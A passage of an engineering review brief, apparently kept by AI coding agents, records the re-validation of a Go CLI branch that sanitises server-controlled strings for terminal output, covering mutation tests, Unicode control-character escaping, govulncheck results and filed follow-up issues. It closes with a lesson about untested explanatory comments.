bidi RLO U+202E           true   false    FALSE
zero-width space U+200B   true   false    FALSE
ZWJ U+200D                true   false    FALSE
BOM U+FEFF                true   false    FALSE
soft hyphen U+00AD        true   false    FALSE
```

- **`api/internal/termsafe/termsafe.go:59`** — *"--json escapes control bytes losslessly"*.
- **`CHANGELOG.md:103`**, user-facing and released — *"`--json` output is deliberately
  untouched, since it already escapes those bytes"*, where *those bytes* is its own
  enumeration: *"terminal control characters and Unicode format characters (the bidi
  overrides, zero-widths, the BOM)"*. **Every Cf family it names is unescaped.** One of
  eight rows is true.

**The decision is right and the reason is wrong** — identical to our own §18 finding.
`--json` is safe because its destination is a **parser**, not because of any encoder
property. And this is the **load-bearing third argument** in `termsafe`'s strip-not-escape
rationale, so the wrong sentence is doing work.

**USER DECISION 2026-08-03: fix `termsafe.go:59` in this MR; FILE the CHANGELOG line as a
GitLab issue** rather than silently rewriting another issue's released user-facing prose.

**What makes this the finding rather than an anecdote:** it landed in a freshly-reviewed
shared **security** package during the same week this branch found five of its own. That is
evidence the pattern is a property of this codebase's commenting culture, not of this
branch. The coder said so first, about work that was not its own.

### Still owed

Full re-validation against `b00ecc83`: the 32-mutation programme, review, audit. Every
measurement in §14-§25 was taken against helpers that have moved.

---

## 29. AMENDMENT 22 — audit re-validation at `84b75153`. NO BLOCKING FINDINGS. Every property closed, withdrawn, or fixed.

Both trees built side by side from `git archive` extracts — the merged tip and `origin/main`
(`136d976a`).

### 🔴 H2 IS LIVE ON `origin/main` TODAY, MEASURED ON A SHIPPING BINARY

```
payload           merged tip 84b75153     origin/main 136d976a
1 MiB version     255 bytes               1,048,635 bytes   (line 1,048,599)
ansi/bidi/osc8/crmid/crtail/crtail2/nltail   clean on BOTH
```

**H1 is closed on `main` too, so ours is genuinely redundant and `termsafe`'s is better** —
a leaf package with a biconditional over every rune, where ours was a call-site convention.
The auditor states it has no reservation about dropping its own finding's fix.

*(§27 quotes 1,048,673 bytes on stderr; the auditor measured 1,048,635 on stdout via
`uzi version`. **Different sink, slightly different payload — not a discrepancy.** Quote
whichever names its sink. Fourth count on this branch to move for a reason other than error.)*

### The one-letter trap is NOT reopened, proven by mutation rather than by reading

```
NAIVE MERGE  cellText -> uzicli.CellText   FAIL TestVersionCommandSanitizesServerBuildInfo/unbounded
M26          drop compactText's 200 cap    FAIL .../unbounded
                                           FAIL TestSkewWarningSanitizesTheServerString/unbounded_build_metadata
                                           FAIL TestLimitWaitLineSanitizesTheRateLimitType
```

H3 re-checked **behaviourally** because `root.go` was a conflict file: all six exempt/non-exempt
rows correct, warning path unchanged.

### The `84b75153` correction is RIGHT, and the re-derivation is stronger than the claim

The auditor re-derived **exhaustively over every rune in Unicode** rather than re-checking
the eight rows, mirroring `termsafe.Unsafe`:

```
Unsafe family    total   json-escaped
C0                  32      32
DEL                  1       0
C1                  32       0
Cf                 170       0
TOTAL              235      32
U+2028 / U+2029   Unsafe=false, escaped=true   <- correctly outside Unsafe
```

**Zero of 170 Cf runes are escaped**, not zero of five sampled. And the corollary is
demonstrated end-to-end on the shipping binary: `uzi version --json` carries RLO U+202E and
PDF U+202C **raw**, and the 1 MiB payload at 1,048,676 bytes. So *"--json is byte-preserving,
NOT terminal-safe"* is exactly right, and the old wording *"escapes control bytes losslessly"*
**would have licensed piping `--json` to a terminal** — false in the direction that mattered.

### 🔴 THE AUDITOR WITHDREW ITS OWN EARLIER LOW FINDING, because `main` closed it better

§17's separator class (Zs/Zl/Zp — neither `IsControl` nor `Cf`, guarded only by duplicate
`TrimSpace` calls, neither individually pinned) **is now pinned by `termsafe`'s biconditional**:

```
MUTATION: remove termsafe.CellText's TrimSpace
FAIL TestValidateAgreesWithCellText/{leading-space, trailing-space, nbsp-tail}
FAIL TestValidateAgreesOverEveryRune
```

`Validate`'s trim clause — whose own comment calls it *"unreachable from today's callers"* —
is what makes the biconditional a property of the **function** rather than of caller
discipline. **Withdrawn: #180 closed it independently and more thoroughly than the one-row
fix this branch was about to ship.**

### 🔴 AN ARGUMENT FOR LANDING THIS BRANCH THAT IS INDEPENDENT OF THE FEATURE

```
merged tip     govulncheck cmd/uzi + uzicli + termsafe   EXIT=0   0 vulnerabilities
origin/main    same command                              EXIT=3   GO-2026-5970 + GO-2026-5320 BOTH LIVE
gitleaks       136d976a..84b75153, 36 commits            clean
```

**`main`'s CLI path is affected by two vulnerabilities today, and this branch is the only fix
in flight.** Stronger than §26's "the bumps are ours alone".

### Precision note, below the graded bar but worth carrying

`84b75153` says *"two thirds of the control half"* — **TRUE per-FAMILY** (DEL and C1 of three
families pass) and **FALSE per-CODEPOINT** (33 of 65 = 51%). The table above it lists exactly
three control rows so the family reading is plainly meant, but the clause pairs a *range* unit
with a fraction whose denominator is *families*. **"two of the three control families"**
removes it. **The CHANGELOG line in issue #219 has the same shape** — carried there.

### Process — a foreign listener produced a clean-looking false result

A Python listener (PID 96298) held port 27411 and was **not the auditor's**. Its server failed
to bind, a stale one answered `curl` 200, and its first exemption matrix read `probes=0` on
every row — **an instrument failure that looked like a clean pass.** It left the process alone
per the ownership rule, moved to a verified-free port, and added a control requiring the server
to write **its own distinctively-named reqlog** rather than merely answering. Probably the
tester's; two harnesses are on adjacent ports.

**That is the uniform-result rule catching a third distinct instrument failure on this branch**
— and the fix is the same shape every time: make the control prove the instrument is *yours*,
not merely that something responded.

---

## 30. AMENDMENT 23 — review re-validation at `84b75153`. All holds. ONE new non-blocking, and it corrects §26.

Every measurement from `git archive` extracts; the shared worktree was never built from. Gate
in an isolated extract: `gofmt -l` empty, `go vet` rc=0, **`RUN=589 PASS=589 FAIL=0 SKIP=0`**
(up from 486 — `termsafe` is now in scope), `deadcode -test` 0 findings against an empty
baseline. `lint:api` **not run and it says so** — ratcheted against `origin/main`, which cannot
resolve in a detached archive.

### Both controls confirmed independently, and the merge is exactly one line

```
CONTROL A  naive merge: version.go local cellText -> uzicli.CellText
           FAIL TestVersionCommandSanitizesServerBuildInfo/unbounded
CONTROL B  M26: compactText's max -> 1<<30
           FAIL .../unbounded  +  FAIL TestSkewWarningSanitizesTheServerString/unbounded_build_metadata
```

Restores verified with `diff -r` against a **fresh** extract, rc=0 both times.
`git diff 136d976a 84b75153 -- api/cmd/uzi/version.go` shows the merge dropped **exactly one
line** from `main`: that call. `hostile_server_test.go` and `sanitize.go` untouched.

### The interaction that most needed checking: N-1 and B2 pull in OPPOSITE directions

A fix implemented as *"don't record on failure"* would have silently reopened B2 (the
negative cache that stops an offline laptop re-probing every command). It was not, and both
are separately pinned. Mutation `if prev, ok := …; ok` → `ok && false`:

```
uzicli    FAIL TestVersionCacheFailedProbeKeepsTheLastKnownVersion
cmd/uzi   FAIL TestSkewWarningSurvivesATransientProbeFailure
          FAIL TestSkewWarningStaleCachePlusFailedProbeKeepsWarning
negative-cache tests under the same fold:  rc=0, STILL GREEN
```

**Three tests, one more than the coder reported** — the hook half from `e3d87d1b`. The
green negative-cache tests are the load-bearing half: B2 is not what paid for the fix.

B2's own discriminator is sharper this round: a server that hangs **only** on `/api/version`,
isolating the probe cost — `2.13s / 0.08s / 0.09s / 0.06s`, cumulative reqs stuck at 1.

### The `termsafe` correction verified a THIRD time, with a column nobody else had

```
U+2028 / U+2029 escaped : true under BOTH default and SetEscapeHTML(false)
```

**That column matters and was not in the eight-row table.** Had U+2028/9 escaping been gated
on `SetEscapeHTML`, the corrected parenthetical would be config-dependent. It is not, so the
sentence is sound as written rather than sound-by-luck.

### 🔴 N-5 (non-blocking) — §26 OVERSTATES, and the overstatement is the lead's

§26 says *"our branch now carries the bound"*. **It carries it for TWO sinks** —
`version.go`'s `serverRows` and the skew warning. **Three sibling sites in the same package
still pass server-controlled strings through the non-truncating `uzicli.CellText`:**

- `api/cmd/uzi/root.go:103` — `uzicli.CellText(err.Error())`
- `api/cmd/uzi/login.go:72` — `uzicli.CellText(start.UserCode)`
- `api/cmd/uzi/login.go:175` — `uzicli.CellText(res.User.Email)`

Measured on the first, with a stub returning a 1 MiB error body:

```
branch 84b75153   stderr = 1,048,582 bytes
main   136d976a   stderr = 1,048,582 bytes      <- BYTE-IDENTICAL
```

**Pre-existing, not a regression, and out of #144's scope.** The two `login.go` sites were
**not executed** (they need the device-auth flow) and the reviewer says so rather than
implying coverage — they are server-controlled by inspection.

**Why it earns a line rather than silence:** `version.go:91-109` now carries a long comment
arguing `uzicli.CellText` is the unsafe choice *because it does not truncate*, and three call
sites in the same tree make exactly that choice on server-controlled input. **A reader of that
comment will ask why the bound stopped at one line.** §26's wording is corrected here; whether
to file the siblings is with the user.

### Deletion lens — nothing orphaned, checked by hand because H1 was dropped wholesale

`deadcode` 43 on both trees, none added, none removed. `uzicli.CellText` retains three
production callers (the branch removed one of `main`'s four); the local `cellText` has 27 call
sites across 11 files; `sanitizeTTY` survives as a delegating wrapper. `Store.Dir()` still
test-only, unchanged by this branch.

---

## 31. AMENDMENT 24 — tester re-run at `84b75153`. GREEN. 35 folds, 2 survivors, both known and non-actionable.

`task gate:api` EXIT=0. Positive control **`RUN=534 PASS=534 FAIL=0 SKIP=0`** (486 → 534;
`internal/termsafe` is now in our gate at 8.535s). `check-docs:web` **re-run rather than
carried over**, because the merge touched `docs/cli.md` and `docs/agent-templates.md`.

**The CVE bumps survived the merge — checked explicitly**, *"because a merge is exactly where
they would silently revert to `main`'s side"*: branch `x/text v0.39.0` + `goldmark v1.7.17`
against `main`'s `v0.38.0` / `v1.7.8`. That check was nobody's instruction.

### 🔴 M30 IS NOW PINNED — the tester's own should-fix from last round is closed

`TestSkewWarningStaleCachePlusFailedProbeKeepsWarning` catches it. Survivors down to two.

### The old `M26` would have become a SILENT NO-OP, and it was caught

At `57db471f`, `M26` was a hand-rolled `noCapProbe` helper stripping `IsControl || Cf`.
Post-merge that predicate lives in `termsafe.Unsafe` — which the tester checked is
**literally** `unicode.IsControl(r) || unicode.In(r, unicode.Cf)`, so the old helper was not
confounded **"by luck rather than design"**. It would have kept passing while no longer
standing for the production predicate. Dropped and re-expressed as `compactText`'s
`const max = 200` → `1 << 30`, which is **wider** — it also reddens
`TestLimitWaitLineSanitizesTheRateLimitType`, a `main`-side test sharing `compactText`.

**This is exactly the "which folds went void" question, and the answer is that none went void
TEXTUALLY while one went void SEMANTICALLY.** A fold that still applies and still passes, but
no longer stands for the thing it was written to stand for, is invisible to every check except
someone re-reading what it targets.

### 🔴 M32 — THE SAME TRAP AT THE WARNING PATH, WHICH NOBODY HAD CHECKED

§26, §27 and every report discussed only `version.go`'s call site. The warning path has the
identical one-letter hazard — and it is also pinned:

```
M31  serverRows  cellText -> uzicli.CellText   FAIL .../unbounded  (stdout 1048627 bytes)
M32  warning     cellText -> uzicli.CellText   FAIL .../unbounded_build_metadata
```

**Both sinks are guarded against the naive resolution, not just the one that conflicted.**
The reason `version.go` got scrutiny is that **git flagged it**; `versioncheck.go` merged
cleanly and was the unexamined half. Attention followed the conflict markers, not the risk.

### M33 — our suite now rests transitively on `main`'s predicate, and the dependency is measured

Weakening `termsafe.Unsafe` to drop its `Cf` half:

```
our packages     40 FAIL lines / 23 subtest rows   incl. our own .../bidi_override (U+202E is Cf)
termsafe's own   15 FAIL lines                     incl. TestValidateAgreesOverEveryRune, a fuzz target
```

**Our bidi row is no longer proved by our code — it is proved by a package we do not own**,
and `termsafe`'s pins are stronger than ours were. If that invariant ever weakens our suite
reddens too, so we find out. That is the property you want from a dependency, stated as a
named risk rather than assumed.

### Survivors — both previously known

- **`M2a`** — the inert server-side `IsValid` guard. Re-derived post-merge: **grid=1521,
  server guard changes 0, CLI guard changes 378.** Unchanged, comment already correct.
- **`M12b`** — the `cliVersion` cap, unpinned but unreachable (both call sites pass the
  compile-time ldflags stamp). LOW.

### Not reached, stated

`./e2e/run-e2e.sh` not run (unstamped harness binary short-circuits the hook; `bash -n`
clean). No live server, no k8s. Only `api/` gated. **`govulncheck` is the auditor's slot and
the tester did not re-run it — §29's clean result is the auditor's, not corroborated.**

---

## 32. 🔒 BRANCH COMPLETE at `6453cbd6`. Eight code commits, all validator-pinned SHAs reachable.

Lead-verified: tree clean, never pushed (0 remote refs), and **every SHA any validator pinned
a measurement to is still an ancestor of HEAD** — `ea71a367`, `f2f778d6`, `e137d145`,
`d23599bb`, `57db471f`, `e3d87d1b`, `b00ecc83`, `84b75153`. The plain-merge decision in §27
is what preserved that; a rebase would have voided every one.

### The final fix, and why it closed rather than patched

The coder re-derived the fraction over **every rune in Unicode** rather than inferring from
the eight-row table:

```
unicode.IsControl codepoints  65
json-escaped                  32   (C0 0x00-0x1F, entire)
NOT escaped                   33   (DEL 1 + C1 32)  = 50.8%
```

Families split **2 of 3**; codepoints split **about half**. It now says *"two of the three
control families"* **and states 33-of-65 beside it** — so the fraction cannot be restored
later by someone who reads the family form and thinks it imprecise. **That is the difference
between fixing an instance and closing it.** It also tightened the adjacent *"neither half of
Cf"* → *"none of Cf at all"* (Cf has no halves, same sentence, same looseness, its own).

### 🔴 THE GENERALISATION WORTH CARRYING OFF THIS BRANCH — the coder's, not the lead's

Seven instances of one defect: a confident sentence stating *why* something is safe,
describing a mechanism nobody had executed.

**The sixth and seventh are both in text written to fix the fifth.**

> *"Not 'we keep being imprecise', but that **corrective text is itself high-risk** — because
> it is written with confidence, under time pressure, by someone who has just been proven
> wrong once and is trying not to be again."*

That reframes every earlier entry in this brief. The class is not carelessness; it is
concentrated **precisely where care is highest**. Corroborating instances from this branch,
all recorded above and none noticed as a pattern at the time: §13's 6b prediction was written
into the brief *to guard against* an untested mechanism and was itself untested; §23's N3
assertion credited itself in its own comment; §30's §26 overstatement was the lead's, in a
section written to correct someone else.

**Practical form:** a correction deserves the same measurement bar as the thing it corrects,
and the moment of highest risk is the sentence written immediately after being caught.

### What no gate can see

`task gate:api` reads none of this. `check-docs.mjs` validates frontmatter and links, not
prose. **Every one of the seven was caught by a person running the mechanism the sentence
described** — never by a tool, never by review-by-reading, and three of the seven survived
multiple careful readings by different agents first.

### Filed rather than swept in

- **#219** — `main`'s CHANGELOG carries the same `--json` claim (unreleased, still fixable).
- **#220** — three unbounded server-controlled sinks in `cmd/uzi`, pre-existing.
- **#221** — `controller/`'s three reachable vulnerabilities, its own `go.mod`, all traces
  through `internal/apiclient/client.go:142`.

Next and last: push, and open the MR.
